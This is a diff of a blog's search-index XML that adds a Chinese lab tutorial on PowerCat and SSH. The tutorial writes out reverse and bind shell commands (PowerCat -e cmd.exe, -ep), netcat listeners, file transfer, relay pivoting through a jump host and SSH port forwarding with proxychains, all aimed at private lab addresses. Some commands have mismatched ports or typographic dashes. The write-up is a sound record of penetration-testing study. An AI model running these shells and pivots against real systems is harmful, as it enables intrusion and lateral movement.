@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>PowerCat&amp;&amp;SSH使用</title>
+      <link href="/posts/19.html"/>
+      <url>/posts/19.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h1><p>PowerCat:windows下面的vc，是一个ps1脚本，windows下面的工具</p><p>PowerCat与netcat命令功能相似，可以相互连接，其中PowerCat可以返回powershell，而netcat不支持</p><h3 id="导入PowerCat"><a href="#导入PowerCat" class="headerlink" title="导入PowerCat"></a>导入PowerCat</h3><pre class="line-numbers language-none"><code class="language-none">powershell  #进入powershell命令行Set-ExecutionPolicy RemoteSigned #设置允许执行本地powershell脚本Import-Module ./PowerCat.ps1PowerCat -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>nc正向连接PowerCat</p><pre class="line-numbers language-none"><code class="language-none">在win7上执行命令，开始监听：PowerCat -l -p 4444 -e c:\windows\system32\cmd.exe -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301953049.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301952138.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301954885.png"></p><pre class="line-numbers language-none"><code class="language-none">在kali上执行命令，连接win7端口获得cmd命令行：nc 192.168.114.7 4444 -vvipconfig验证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111301955720.png"></p><h3 id="反向连接PowerCat"><a href="#反向连接PowerCat" class="headerlink" title="反向连接PowerCat"></a>反向连接PowerCat</h3><pre class="line-numbers language-none"><code class="language-none">在kali上执行命令监听：nc -l -p 4444 -vv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302007490.png"></p><pre class="line-numbers language-none"><code class="language-none">在win7中执行命令：PowerCat -c 192.168.114.10 -p 4444 -v -e cmd.exe其中端口是边界kali的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302006882.png"></p><h3 id="通过PowerCat反弹powershell"><a href="#通过PowerCat反弹powershell" class="headerlink" title="通过PowerCat反弹powershell"></a>通过PowerCat反弹powershell</h3><pre class="line-numbers language-none"><code class="language-none">在边界kali上执行命令监听：nc -l -p 4444 -vv开始监听在win7中执行命令：PowerCat -c 192.168.114.10 -p 4444 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302012336.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302012420.png"></p><h3 id="win12和win7通过powercat连接"><a href="#win12和win7通过powercat连接" class="headerlink" title="win12和win7通过powercat连接"></a>win12和win7通过powercat连接</h3><pre class="line-numbers language-none"><code class="language-none">win7反弹win12，win12监听端口，win7让他主动去连接win7：powercat -l -v -p 899win12:powercat -c 192.168.114.12 -p 889 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302029154.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302030056.png"></p><p>反过来</p><p>win7中</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302033475.png"></p><p>win2016</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302033801.png"></p><p>以上是powercat获取shell方式</p><h3 id="通过PowerCat与nc传输文件"><a href="#通过PowerCat与nc传输文件" class="headerlink" title="通过PowerCat与nc传输文件"></a>通过PowerCat与nc传输文件</h3><pre class="line-numbers language-none"><code class="language-none">在kali上执行命令监听：nc -l -p 5566 &gt; test.txt开始监听，并把传输的内容写入到test.txt中在win7中执行命令：PowerCat -c 192.168.83.100 -p 4444 -i C:\PowerCat-master\README.md -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302040642.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302041717.png"></p><h3 id="两个内网机子进行文件传输"><a href="#两个内网机子进行文件传输" class="headerlink" title="两个内网机子进行文件传输"></a>两个内网机子进行文件传输</h3><pre class="line-numbers language-none"><code class="language-none">win7：powercat -l -v -p 3333 -of c:\1.txtwin16powercat  -c 192.168.114.7 -p 3333 -i c:\2.txt -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302052836.png" alt="win2016"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302052845.png" alt="win7"></p><h3 id="使用PowerCat作为跳板"><a href="#使用PowerCat作为跳板" class="headerlink" title="使用PowerCat作为跳板"></a>使用PowerCat作为跳板</h3><pre class="line-numbers language-none"><code class="language-none">靶机监听：PowerCat -l -v -p 6666 -e cmd.exe跳板机监听：PowerCat -l -v -p 4444 -r tcp:192.168.83.91:6666这样，当访问跳板机的4444端口时，就会把流量转发给靶机（192.168.83.91）的6666端口中了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302053269.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302059818.png"></p><pre class="line-numbers language-none"><code class="language-none">以win16为跳板，通过16获得win7的shell边界kali连接跳板机win16win7： powercat -l -v -p 6767 -e c:\windows\system32\cmd.exewin16:powercat -l -v -p 8888 -r tcp:192.168.114.7:6767边界kali： nc 192.168.114.12 8888 -vv若失败的话，则win7和win16反过来试试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302105285.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302105855.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302105733.png"></p><pre class="line-numbers language-none"><code class="language-none">ping边界kali，通了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302107231.png"></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302110292.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302110736.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302110188.png"></p><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302111495.png"></p><pre class="line-numbers language-none"><code class="language-none">先修改两个kali中的ssh配置文件：vim /etc/ssh/sshd_config保证这五个是yes改完记得重启服务：service ssh restart        或者/etc/init/ssh restart(这个好像没啥用)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302133231.png"></p><pre class="line-numbers language-none"><code class="language-none">vps kali中    ssh –CfNg –L 2222:192.168.114.7:3389 root@192.168.43.21win7的3389转发到2222<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ssh远程转发"><a href="#ssh远程转发" class="headerlink" title="ssh远程转发"></a>ssh远程转发</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302233806.png"></p><pre class="line-numbers language-none"><code class="language-none">ssh –CfNg –L 2222（vps）:192.168.63.8:3389 root@192.168.3.19物理机访问：192.168.43.19:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h3><p>建立sock4/5代理通道</p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302252738.png"></p><pre class="line-numbers language-none"><code class="language-none">vps kali中：  ssh –CfNg –D 5000 root@192.168.43.21再输入密码确认代理是否开启可以查看端口库：netstat -ant再开win7中的phpstudy物理机浏览器输入，首先手动配置代理192.168.43.21 5000浏览器访问192.168.114.7vps中： vim /etc/proxychains.conf写入socks5：192.168.43.21 5000保存如果要访问它：proxychains curl 192.168.150.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302248182.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 内网 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>NECAT使用</title>
       <link href="/posts/18.html"/>
       <url>/posts/18.html</url>
@@ -20,9 +47,9 @@
       
         <tags>
             
-            <tag> 内网 </tag>
-            
             <tag> 渗透 </tag>
+            
+            <tag> 内网 </tag>
             
         </tags>
       
@@ -47,9 +74,9 @@
       
         <tags>
             
-            <tag> 内网 </tag>
-            
             <tag> 渗透 </tag>
+            
+            <tag> 内网 </tag>
             
         </tags>
       
@@ -58,7 +85,7 @@
     
     
     <entry>
-      <title>内网信息收集</title>
+      <title>域内信息收集</title>
       <link href="/posts/16.html"/>
       <url>/posts/16.html</url>
       
@@ -74,9 +101,9 @@
       
         <tags>
             
-            <tag> 内网 </tag>
-            
             <tag> 渗透 </tag>
+            
+            <tag> 内网 </tag>
             
         </tags>
       
@@ -101,9 +128,9 @@
       
         <tags>
             
-            <tag> 内网 </tag>
-            
             <tag> 渗透 </tag>
+            
+            <tag> 内网 </tag>
             
         </tags>
       
@@ -128,9 +155,9 @@
       
         <tags>
             
-            <tag> 内网 </tag>
-            
             <tag> 渗透 </tag>
+            
+            <tag> 内网 </tag>
             
         </tags>
       
